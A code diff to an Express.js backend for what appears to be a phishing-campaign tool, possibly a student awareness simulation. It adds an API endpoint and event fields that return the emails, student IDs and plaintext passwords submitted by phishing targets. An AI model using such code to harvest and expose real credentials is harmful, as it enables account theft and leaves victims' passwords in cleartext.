@@ -135,6 +135,42 @@ router.post('/api/reset', async (req, res) => {
   }
 });
 
+router.get('/api/credentials', async (req, res) => {
+  try {
+    const db = await getDb();
+    const PLACEHOLDERS = new Set(['TARGET_ID_PLACEHOLDER', 'CAMPAIGN_ID_PLACEHOLDER']);
+
+    const credentials = [...db.data.events]
+      .filter(
+        (e) =>
+          e.event === 'credentials_submitted' &&
+          !PLACEHOLDERS.has(e.target_id) &&
+          !PLACEHOLDERS.has(e.campaign_id)
+      )
+      .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
+      .map((event) => {
+        const target = db.data.targets.find((t) => t.id === event.target_id);
+        const campaign = db.data.campaigns.find((c) => c.id === event.campaign_id);
+        return {
+          id: event.id,
+          timestamp: event.timestamp,
+          campaign_id: event.campaign_id,
+          campaign_name: campaign?.name || 'Unknown',
+          template: campaign?.template || 'unknown',
+          recipient_email: target?.email || null,
+          student_id: event.student_id || target?.submitted_student_id || null,
+          submitted_email: event.email || target?.submitted_email || null,
+          password: event.password || target?.submitted_password || null,
+        };
+      });
+
+    res.json(credentials);
+  } catch (err) {
+    console.error('Get credentials error:', err);
+    res.status(500).json({ error: 'Failed to fetch credentials' });
+  }
+});
+
 router.get('/api/events', async (req, res) => {
   try {
     const db = await getDb();
@@ -164,6 +200,8 @@ router.get('/api/events', async (req, res) => {
           recipient_email: recipientEmail,
           email: recipientEmail || event.email || null,
           student_id: event.student_id || null,
+          submitted_email: event.email || null,
+          submitted_password: event.password || null,
           submitted_value,
           display_id,
         };
